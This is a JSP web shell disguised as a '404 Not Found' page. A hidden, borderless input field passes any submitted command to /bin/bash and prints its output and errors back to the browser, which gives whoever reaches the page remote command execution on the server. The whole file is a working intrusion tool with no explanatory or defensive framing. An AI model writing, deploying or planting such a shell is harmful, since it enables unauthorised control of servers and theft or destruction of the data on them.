<!-- gh/aels -->
<H1><CENTER>404 Not Found</CENTER></H1>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    String error = "";
    if(cmd != null) {
        String[] commandAndArgs = new String[]{ "/bin/bash", "-c", cmd };
        String s = null;
        Process process = Runtime.getRuntime().exec(commandAndArgs);
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        Thread.sleep(2000);
        while(process.isAlive()) Thread.sleep(100);
        while((s = reader.readLine()) != null) { output += s+"\n"; }
        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        while((s = reader.readLine()) != null) { error += s+"\n"; }
    }
%>
<FORM><INPUT name=cmd style=border:0;display:block; type=text value='<%=cmd %>'></FORM>
<pre>
    <%=output %>
    <%=error %>
</pre>